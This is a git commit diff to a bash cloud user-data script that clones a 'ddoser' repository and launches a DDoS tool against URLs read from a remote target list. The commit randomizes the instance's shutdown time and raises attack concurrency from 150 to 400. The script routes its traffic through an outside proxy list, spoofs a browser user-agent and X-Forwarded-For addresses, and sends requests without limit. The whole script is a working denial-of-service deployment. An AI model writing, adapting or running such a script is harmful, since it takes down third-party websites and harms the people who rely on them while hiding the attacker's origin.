43666e76081a86fcf85871c6f0dbe218570920cb
romsua <kaplun89@gmail.com>
2022-03-03 18:25:59 +0200

    randomizer for shutdown

--- user_data_ddoser.sh
+++ user_data_ddoser.sh
@@ -1,10 +1,14 @@
 #!/bin/bash
 set -x 
 sudo systemctl start amazon-ssm-agent
-sudo shutdown +15
+MAX_TIME=20
+MIN_TIME=13
+DIFF=$(($MAX_TIME-$MIN_TIME+1))
+R=$(($(($RANDOM%$DIFF))+$MIN_TIME))
+sudo shutdown +$R
 yum install -y python3-pip git
 ulimit -n 100000
 git clone https://github.com/taransergey/ddoser.git
 cd ddoser/
 pip3 install -r requirements.txt
-python3 ./ddoser.py --concurrency 150 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/romsua/swine/master/swinerus.txt --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip
+python3 ./ddoser.py --concurrency 400 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/romsua/swine/master/swinerus.txt --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip
